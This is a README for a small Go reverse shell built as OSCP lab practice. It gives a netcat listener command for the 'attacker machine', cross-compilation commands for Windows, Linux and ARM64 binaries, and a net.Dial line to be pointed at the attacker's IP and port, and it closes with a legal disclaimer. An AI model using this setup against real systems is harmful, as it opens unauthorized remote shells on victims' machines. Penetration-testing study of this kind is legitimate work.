# Simple Go Reverse Shell (OSCP Study Lab)

A lightweight, cross-platform reverse shell written in Go. This project was created as part of my preparation for the **OSCP (Offensive Security Certified Professional)** certification to better understand network sockets and process redirection in Golang.

## 🚀 Overview

The tool establishes a TCP connection to a specified listener and redirects the standard input, output, and error streams to a system shell (`powershell` for Windows or `sh` for Unix-like systems).

### Features:
- **Small Footprint:** Compiles into a single, static binary.
- **Cross-Platform:** Can be easily compiled for Windows, Linux, and macOS.
- **No Dependencies:** Uses only standard Go libraries.

---

## 🛠️ Usage

### 1. Start a Listener
On your attacker machine (Kali Linux), start a netcat listener:
```bash
nc -lvnp 4444
```

### Build & Cross-Compilation Guide

🪟 Windows (x64)

```bash
GOOS=windows GOARCH=amd64 go build -o revershell.exe revershell.go
```

 🐧 Linux (x64)
 
```bash
GOOS=linux GOARCH=amd64 go build -o shell main.go
```

📱 ARM64 (Linux/macOS)

```bash
GOOS=linux GOARCH=arm64 go build -o shell_arm64 main.go
```

### Configuration

Before compiling, you must point the reverse shell to your attacker machine's IP address and the port you intend to listen on.

Open `revershell.go` and update the connection string:

```go
// Replace "127.0.0.1" with your IP (e.g., "10.10.14.5") 
// Replace "4444" with your desired port 
conn, _ := net.Dial("tcp", "your_ip_here:your_port_here")
```


## ⚖️ Legal Disclaimer

> [!WARNING] **For Educational and Ethical Use Only.**

This project and its source code are intended **strictly for educational purposes**, authorized security auditing, and penetration testing environments (such as HTB, THM, or private labs).

1. **Usage for illegal activities** is strictly prohibited and may lead to severe legal consequences.
    
2. **The author** assumes no liability and is not responsible for any misuse or damage caused by this tool.
    
3. **Always obtain explicit written consent** before testing any system or network that you do not own.
    

By using this software, you agree to take full responsibility for your actions. 🛡️